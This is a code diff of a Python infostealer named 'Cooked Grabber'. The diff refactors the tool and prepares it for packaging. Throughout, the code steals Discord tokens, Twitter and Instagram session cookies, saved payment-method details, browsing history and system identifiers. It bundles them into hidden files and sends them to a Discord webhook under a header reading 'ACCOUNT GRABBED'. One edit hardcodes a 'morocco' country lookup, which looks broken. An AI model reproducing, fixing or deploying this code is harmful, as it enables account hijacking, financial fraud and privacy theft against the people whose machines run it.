@@ -19,11 +19,11 @@ from browser_history import get_history
 from prettytable import PrettyTable
 from platform import platform
 from getmac import get_mac_address as gma
-from pycountry import countries
-from cpuinfo import get_cpu_info
 from psutil import virtual_memory
 from collections import defaultdict
 from zipfile import ZipFile, ZIP_DEFLATED
+from cpuinfo import get_cpu_info
+from multiprocessing import freeze_support
 
 website = ['discord.com', 'twitter.com', 'instagram.com']
 
@@ -43,15 +43,7 @@ def has_payment_methods(tk):
 
 def cookies_grabber_mod(u):
     cookies = []
-    browsers = [
-        "chrome",
-        "edge",
-        "firefox",
-        "brave",
-        "opera",
-        "vivaldi",
-        "chromium",
-    ]
+    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
     for browser in browsers:
         try:
             cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
@@ -131,7 +123,7 @@ def main():
     db = connect(filename)
     db.text_factory = lambda b: b.decode(errors="ignore")
     for w in website:
-        if w == 'discord.com':
+        if w == website[0]:
             tokens = []
             def discord_tokens(path):
                 for file_name in os.listdir(path):
@@ -160,17 +152,17 @@ def main():
             for t in threads:
                 t.start()
                 t.join()
-        elif w == 'twitter.com':
+        elif w == website[1]:
             t_cookies, t_lst = ([] for _ in range(2))
-            for b in cookies_grabber_mod('twitter.com'):
+            for b in cookies_grabber_mod(w):
                 t_cookies.append(b.split(', '))
             for c in t_cookies:
                 for y in c:
                     if search(r"auth_token", y) != None:
                         t_lst.append(y.split(' ')[1].split("=")[1])
-        elif w == 'instagram.com':
+        elif w == website[2]:
             insta_cookies, insta_lst = ([] for _ in range(2))
-            for b in cookies_grabber_mod('instagram.com'):
+            for b in cookies_grabber_mod(w):
                 insta_cookies.append(b.split(', '))
             browser_ = defaultdict(dict)
             for c in insta_cookies:
@@ -188,9 +180,8 @@ def main():
             for x in insta_lst:
                 for y in x:
                     x[x.index(y)] = y[1]
-    all_data_p, lst_b = ([] for _ in range(2))
     for x in tokens:
-        lst_b = has_payment_methods(x)
+        all_data_p, lst_b = [] ,has_payment_methods(x)
         try:
             for n in range(len(lst_b)):
                 if lst_b[n]['type'] == 1:
@@ -245,13 +236,13 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
             payment_p.field_names = ["Email", "Type", "Billing Adress"]
             payment_p.add_row([_p[0], "Paypal", _p[2]])
             pay_l.append(payment_p.get_string())
-    files_names = [["Discord Tokens.txt", "discord_T"], ["Twitter Token.txt", "twitter_T"], ["Instagram Token.txt", "insta_T"]]
+    files_names = [["Discord Tokens.txt", discord_T], ["Twitter Tokens.txt", twitter_T], ["Instagram Tokens.txt", insta_T]]
     for x_, y_ in files_names:
-        if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0):
+        if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0) or (y_ == files_names[3][1] and len(main_info[4])!=0):
             replace_new(x_)
             with open(x_, 'w') as wr:
                 SetFileAttributes(x_, win32con.FILE_ATTRIBUTE_HIDDEN)
-                wr.write(eval(f"{y_}.get_string()"))
+                wr.write(y_.get_string())
     replace_new("data.zip")
     with ZipFile("data.zip", mode='w', compression=ZIP_DEFLATED) as zip:
         SetFileAttributes("data.zip", win32con.FILE_ATTRIBUTE_HIDDEN)
@@ -263,6 +254,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                     f.write(f"{i}\n")
             zip.write("Payment Info.txt")
             os.remove("Payment Info.txt")
+        replace_new("History.txt")
         with open('History.txt', 'w') as f:
             SetFileAttributes("History.txt", win32con.FILE_ATTRIBUTE_HIDDEN), f.write(find_His())
         zip.write("History.txt")
@@ -275,9 +267,9 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
         webhook = DiscordWebhook(url=URL, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
         embed = DiscordEmbed(title='Cooked Grabber', color='00FF00')
         embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
-        embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{countries.get(name=p_lst[1]).alpha_2.lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
+        embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get('https://restcountries.com/v3/name/morocco').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
         embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
-        embed.add_embed_field(name='ACCOUNT HACKED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
+        embed.add_embed_field(name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
         card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
         embed.add_embed_field(name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
         embed.set_author(
@@ -293,6 +285,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
     os.remove("data.zip")
 
 if __name__ == "__main__":
+    freeze_support()
     if len(sys.argv) == 1:
         send_webhook(['YOUR DISCORD WEBHOOK URL'])
     else:
